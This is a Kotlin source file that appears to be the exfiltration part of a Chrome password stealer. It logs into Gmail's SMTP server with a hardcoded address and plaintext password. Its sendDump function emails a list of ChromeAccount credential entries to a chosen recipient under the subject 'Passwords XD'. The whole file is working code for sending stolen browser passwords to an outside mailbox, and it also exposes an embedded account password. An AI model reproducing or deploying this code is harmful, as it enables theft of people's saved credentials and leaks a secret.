import java.util.*
import javax.mail.*
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage

object MailerTLS {
    // Account no longer exist. Just for testing purposes :)
    private const val emailToUse = "dmitrythrowlol@gmail.com" /* Your gmail */
    private const val password = "A51e93A9EkZTAY" /* Your gmail password*/

    private val properties: Properties = Properties().apply {
        this["mail.smtp.auth"] = "true"
        this["mail.smtp.starttls.enable"] = "true"
        this["mail.smtp.host"] = "smtp.gmail.com"
        this["mail.smtp.port"] = "587"
    }

    private val session: Session = Session.getDefaultInstance(properties, object : Authenticator() {
        override fun getPasswordAuthentication(): PasswordAuthentication {
            return PasswordAuthentication(emailToUse, password)
        }
    })

    private fun generatePlainTextEmail(email: String, _subject: String, emailBody: String) =
            MimeMessage(session).apply {
                setFrom(InternetAddress("dmitrythrowlol@gmail.com"))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(email))
                subject = _subject
                setText(emailBody)
            }

    fun sendDump(email: String, listOfAccounts: List<ChromeAccount>): Boolean = try {
        val body = listOfAccounts.toString()
        generatePlainTextEmail(email, "Passwords XD", body).run { Transport.send(this) }

        true
    } catch (e: MessagingException) {
        e.printStackTrace()
        false
    }
}